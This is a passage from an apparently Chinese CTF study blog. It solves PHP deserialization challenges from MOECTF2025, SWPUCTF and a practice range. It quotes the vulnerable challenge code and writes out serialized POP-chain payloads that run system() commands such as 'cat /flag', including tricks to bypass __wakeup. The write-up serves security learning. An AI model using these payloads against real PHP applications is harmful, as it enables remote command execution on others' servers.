<p>获得最终 payload:</p>
<p>O:4:”INIT”:1:{s:4:”name”;O:1:”B”:1:{s:1:”b”;O:1:”A”:1:{s:1:”a”;s:8:”flag.php”;}}}</p>
<p>运行通过!</p>
<p><img src="/images/ZumHb7fuaoBULox6ZSlcEw2Nnmd.png"></p>
<h2 id="反序列化靶场-Level17-字符串逃逸"><a href="#反序列化靶场-Level17-字符串逃逸" class="headerlink" title="[反序列化靶场]Level17-字符串逃逸"></a>[反序列化靶场]Level17-字符串逃逸</h2><p>读题，本题是想告诉我们当序列化字符串中没有对应类的一些成员属性的时候，在反序列化时，解释器会直接从当前类中 COPY 序列化中不存在的成员属性。</p>
<p><img src="/images/ASXjb0SJmociZxxQlBwcYf3nn6g.png"></p>
<p>直接 payload:</p>
<p>o&#x3D;O:1:”A”:1:{s:11:”helloctfcmd”;s:8:”get_flag”;}</p>
<p>即得</p>
<p><img src="/images/Xg5abFXEjoyXVoxt8SDco4qZnRd.png"></p>
<h2 id="反序列化靶场-Level18-字符串逃逸-2"><a href="#反序列化靶场-Level18-字符串逃逸-2" class="headerlink" title="[反序列化靶场]Level18-字符串逃逸 2"></a>[反序列化靶场]Level18-字符串逃逸 2</h2><p>先读本题提示:序列化和反序列化的规则特性,字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 “;}” 作为字符串的结尾判定。</p>
<p><img src="/images/NWvjbAHfHo0k44x0tGYcK7YZnTe.png"></p>
<p>可以看到本题要求我们做一些替换工作让 <code>key</code> 值为 <code>GET_FLAG</code> ，而在前面的对象创建过程中，我们知道 key 值为 <code>GET_FLAG&quot;;}FAKE_FLAG</code>，根据我们所知的特性，将 key 值对应的字符数量缩窄只留下 <code>GET_FLAG</code>，也就是 8 个字符 —— 将 20 替换为 8 即可，接着 题目要求一个新的 FLAG 类，所以还需要将类名标识由 Demo 改为 FLAG。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target</span> = [<span class="string">&#x27;Demo&#x27;</span>,<span class="number">20</span>]</span><br><span class="line"><span class="variable">$change</span> = [<span class="string">&#x27;FLAG&#x27;</span>,<span class="number">8</span>]</span><br></pre></td></tr></table></figure>

<p>使用数组进行正确 payload:</p>
<p>target[]&#x3D;Demo&amp;target[]&#x3D;20&amp;change[]&#x3D;FLAG&amp;change[]&#x3D;8</p>
<p>即得</p>
<p><img src="/images/KujibsGt2ocLiTx8xNBcFUXRnfc.png"></p>
<p>注:回显 bool(false),是因为大括号内属性和大括号外声明的成员属性数量或字符串长度不一致,需要检查成员属性个数或字符串长度.</p>
<h2 id="SQCTF-逃-1"><a href="#SQCTF-逃-1" class="headerlink" title="[SQCTF]逃"></a>[SQCTF]逃</h2><p>见<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/IaWEwOlPLiMnYYkdvxCcVDhJndb#share-XlHBdFcp0otfERxBVeecurHgn7d">[Week7.3]反序列化漏洞利用</a></p>
<h2 id="MOECTF2025-第十七章-星骸迷阵·神念重构"><a href="#MOECTF2025-第十七章-星骸迷阵·神念重构" class="headerlink" title="[MOECTF2025]第十七章 星骸迷阵·神念重构"></a>[MOECTF2025]第十七章 星骸迷阵·神念重构</h2><p>读题,这里应该是用序列化创建一个类 A 的实例，并将成员变量 a 赋值为需要执行的命令</p>
<p><img src="/images/QBAzbVCV4oZrcUxvTy0cxN8XnOb.png"></p>
<p>以 ls 为命令，写一个序列化的脚本,点击运行获得 payload</p>
<p><img src="/images/AaMTbwZofo4KICxNSMxcR2rWnkc.png"></p>
<p>命令就被成功执行了</p>
<p><img src="/images/HjMNb054towTR6xKXB0cTdPunPb.png"></p>
<p>改成 cat &#x2F;flag,检查字符个数 flag 就被打印了</p>
<p><img src="/images/GhprbGYRJoe3a2x1GSKce6TMnqd.png"></p>
<h2 id="MOECTF2025-第十八章"><a href="#MOECTF2025-第十八章" class="headerlink" title="[MOECTF2025]第十八章"></a>[MOECTF2025]第十八章</h2><p>读题，必然是考 POP 链构造，只有两个类很简单</p>
<p><img src="/images/EelMbnocWoiN1wxjEMqcJjenn2f.png"></p>
<p>写脚本，发现没法在外部修改 name 值，我们先把 name 改成公有，最后才调配格式</p>
<p><img src="/images/TyIRbe0BaogdrAxnhV3cEIEonPd.png"></p>
<p><img src="/images/VCHXbKuCqoixF8xeSJfcnDOEne8.png"></p>
<p>private 改成了 public，输出是这样，a 的 name 属性指向 b，b 的 work 函数在 A 序列化时执行</p>
<p><img src="/images/IfjzbJzSAo62haxAQaJcvPpanvg.png"></p>
<p>改成私有，payload:</p>
<p>O:7:”PersonA”:1:{s:13:”%00PersonA%00name”;O:7:”PersonB”:1:{s:4:”name”;s:18:”echo system(‘ls’);”;}}</p>
<p><img src="/images/EKzlbTdqUoqglJxFPV6cYD04nge.png"></p>
<p>看看根目录 s:18 改成 20 ls &#x2F;果然有 flag</p>
<p><img src="/images/Q0I3blbfsooQKLxSRwuckW6vnNe.png"></p>
<p>命令 cat &#x2F;flag 即得本关旗帜</p>
<p><img src="/images/Eb4Gb1H5GoxGD4x3V3Fc6Gkcntb.png"></p>
<h2 id="MOECTF2025-第十九章"><a href="#MOECTF2025-第十九章" class="headerlink" title="[MOECTF2025]第十九章"></a>[MOECTF2025]第十九章</h2><p>读题，还是个比较难的 POP 链，其中带了个轻过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id; </span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>; </span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id; </span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age; </span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable">$age</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Check</span>(<span class="params"><span class="variable">$age</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$this</span>-&gt;age . <span class="variable">$this</span>-&gt;name,<span class="string">&quot;flag&quot;</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$age</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age; </span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id; </span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable">$age</span>; </span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到突破口$name($age); 顺思路构造 payload,即得答案</p>
<p>O:7:”PersonC”:3:{s:4:”name”;s:6:”system”;s:2:”id”;O:7:”PersonB”:3:{s:4:”name”;s:9:”cat &#x2F;????”;s:2:”id”;O:7:”PersonA”:3:{s:4:”name”;r:1;s:2:”id”;s:7:”__Check”;s:3:”age”;N;}s:3:”age”;N;}s:3:”age”;N;}</p>
<p>注意，$ 变量名 +()不一定是为了执行 invoke，也有变量名是命令执行函数名的情况，直接执行命令执行函数</p>
<p>反序列化很重要，我们再加练几道题熟悉一下魔术方法和 POP 链…</p>
<h2 id="SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_unserialize"></a>[SWPUCTF 2022 新生赛]ez_ez_unserialize</h2><p>做题前我们需要知道__FILE__永远指向<strong>当前正在执行的这个 PHP 文件的完整绝对路径</strong>（包含目录 + 文件名）</p>
<p>所以本题我们既需要为 x 赋给好了的 php 文件，又要绕过 wakeup 函数把他赋值回无用的__FILE__</p>
<p>因此我们在序列化的时候将元素个数改为大于 1 的数</p>
<p><img src="/images/Yasvb8CYIoS7W9xBDqacXblxnle.png"></p>
<p>将原本成员个数的 1 改成 2，即得 flag</p>
<p><img src="/images/HpRvbx2fqoW2cgxVH6pc0LJEnxb.png"></p>
<h2 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h2><p>待做 需要用到未来知识</p>
<h2 id="SWPUCTF-2021-新生赛-no-wakeup"><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h2><p>读题，还是绕过 wakeup</p>
<p><img src="/images/LkpDbRsIOobx0Bx6Zc3cZ45Yn3n.png"></p>
<p>同样的道理</p>
<p><img src="/images/VCjtbha0ZoTI8QxAfVgcMsDPnDe.png"></p>
<h2 id="SWPUCTF-2022-新生赛-1z-unserialize"><a href="#SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]1z_unserialize"></a>[SWPUCTF 2022 新生赛]1z_unserialize</h2><p>读题,发现有形如$a($b)的情况，这里可将$a视为命令执行函数，$b 视为函数参数执行命令执行函数</p>
<p><img src="/images/P4MvbQcF7o0ecSxG6eacKQ1lnFf.png"></p>
<p>编写脚本获得 payload，即可进行命令执行</p>
<p><img src="/images/XvkqbCwnPoZ2voxOKbBcvAGynmd.png"></p>
<p><img src="/images/NTvtbevuno3dxFxa3ivcwAOonIP.png"></p>
<p>注意了后面试了一下，ls 命令不可以用单引号覆盖，有些命令加了单引号就不能执行了</p>
<p><img src="/images/PNwVbigfYo2SzLxwIhfcFEdUnFh.png"></p>
<p><img src="/images/AWWnbPLcbopJiixTovYcwYUxnpb.png"></p>
<h2 id="SWPUCTF-2023-秋季新生赛-UnS3rialize"><a href="#SWPUCTF-2023-秋季新生赛-UnS3rialize" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]UnS3rialize"></a>[SWPUCTF 2023 秋季新生赛]UnS3rialize</h2><p>又到了喜闻乐见的 POP 链啊,我们观察一下吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NSS</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;W4keup!!!&lt;br/&gt;&quot;</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo Welcome to NSSCTF&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$whoami</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$argv</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what do you want?&quot;</span>; </span><br><span class="line">        <span class="variable">$want</span> = <span class="variable language_">$this</span>-&gt;whoami; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$want</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger&quot;</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sth-&gt;<span class="keyword">var</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&quot;nss&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span> = <span class="string">&quot;ctf&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$notes</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$passwd</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user === <span class="string">&quot;SWPU&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;NSS&quot;</span>) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __construct&lt;br/&gt;&quot;</span>; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;your notes&quot;</span>.<span class="variable language_">$this</span>-&gt;notes; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;N0!&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$ser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>])); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Let&#x27;s do some deserialization :)&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先找这个题目的突破口在哪里，显然是类 NSS 的 system 函数，成员变量 cmd 应该是你要执行的指令</p>
<p>有</p>
<p>$a&#x3D;new NSS();</p>
<p>$a-&gt;cmd&#x3D;”ls”;</p>
<p>要触发 system，要执行 invoke</p>
<p>要执行 invoke，必然要修改 class C 中的 $want</p>
<p>$b&#x3D;new C();</p>
<p>$b-&gt;whoami&#x3D;$a;</p>
<p>执行 invoke 的前提条件是类 C 的 get 被执行</p>
<p>我们复习一下:</p>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</p>
<p>还剩下 T F 两个类选一个来读取类 C 中不存在的值，我们发现 T 有个变量 <code>var</code> 谁也没有</p>
<p>于是有</p>
<p>$c&#x3D;new T();</p>
<p>$c-&gt;sth&#x3D;$b;&#x2F;&#x2F;用于访问 $b 即类 C 的不存在变量</p>
<p>最后就是用类 F 执行 T 的 tostring 了，这个很简单</p>
<p>$d&#x3D;new F();</p>
<p>$d-&gt;user&#x3D;”SWPU”;</p>
<p>$d-&gt;passwd&#x3D;”NSS”;</p>
<p>$d-&gt;note&#x3D;$c;&#x2F;&#x2F;用于打印 c</p>
<p>我们把这几行代码全输到脚本里</p>
<p><img src="/images/LDoybzVHXobPTXxsfTDcIbSMnAf.png"></p>
<p>得到 payload:</p>
<p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:1:{s:3:”cmd”;s:2:”ls”;}}}}</p>
<p>进行 base64 编码,使用 get 提交即可.</p>
<p>卧槽?还得绕过 wakeup,改一个数字</p>
<p>O:1:”F”:4:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:1:{s:3:”cmd”;s:2:”ls”;}}}}</p>
<p>运行通过!</p>
<p><img src="/images/F6Ccb6aeGoQLdHxRbcFcjkTunDb.png"></p>
<p>查 ls &#x2F; 根目录下 flag</p>
<p><img src="/images/SR6LbHXkVo5MQMxOZMhcvN4Xndc.png"></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2026/01/18/hello-world/" rel="prev" title="欢迎大家前来阅读文章">
      <i class="fa fa-chevron-left"></i> 欢迎大家前来阅读文章
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week7-1-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%AA%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">[Week7.1]php 反序列化绪论</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.1.</span> <span class="nav-text">PHP 类与对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-%E2%80%9C%E7%B1%BB%E2%80%9D%EF%BC%9F%E2%80%94%E2%80%94-%E5%AF%B9%E8%B1%A1%E7%9A%84-%E2%80%9C%E6%A8%A1%E6%9D%BF%E2%80%9D"><span class="nav-number">1.1.1.</span> <span class="nav-text">什么是 “类”？—— 对象的 “模板”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-%E2%80%9C%E5%AF%B9%E8%B1%A1%E2%80%9D%EF%BC%9F%E2%80%94%E2%80%94-%E7%B1%BB%E7%9A%84-%E2%80%9C%E5%AE%9E%E4%BE%8B%E2%80%9D"><span class="nav-number">1.1.2.</span> <span class="nav-text">什么是 “对象”？—— 类的 “实例”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A0%B8%E5%BF%83"><span class="nav-number">1.1.3.</span> <span class="nav-text">知识点核心</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level1-%E7%B1%BB%E7%9A%84%E5%AE%9E%E4%BE%8B%E5%8C%96"><span class="nav-number">1.2.</span> <span class="nav-text">*[反序列化靶场]Level1-类的实例化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%93%E5%B1%95-%E7%BB%99%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">1.2.1.</span> <span class="nav-text">拓展:给变量命名的情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level2-%E5%80%BC%E7%9A%84%E4%BC%A0%E9%80%92"><span class="nav-number">1.3.</span> <span class="nav-text">*[反序列化靶场]Level2-值的传递</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level3-%E5%80%BC%E7%9A%84%E6%9D%83%E9%99%90"><span class="nav-number">1.4.</span> <span class="nav-text">*[反序列化靶场]Level3-值的权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%93%E5%B1%95-%E7%88%B6%E5%AD%90%E7%B1%BB%E5%92%8C%E5%B5%8C%E5%A5%97%E7%B1%BB%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.4.1.</span> <span class="nav-text">拓展:父子类和嵌套类的区别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.5.</span> <span class="nav-text">序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88serialize-%E5%87%BD%E6%95%B0%E2%80%93%E5%AF%B9%E8%B1%A1-%E2%86%92-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.5.1.</span> <span class="nav-text">序列化（serialize () 函数–对象 → 字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88unserialize-%E5%87%BD%E6%95%B0%EF%BC%89%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2-%E2%86%92-%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.5.2.</span> <span class="nav-text">反序列化（unserialize () 函数）：字符串 → 对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.3.</span> <span 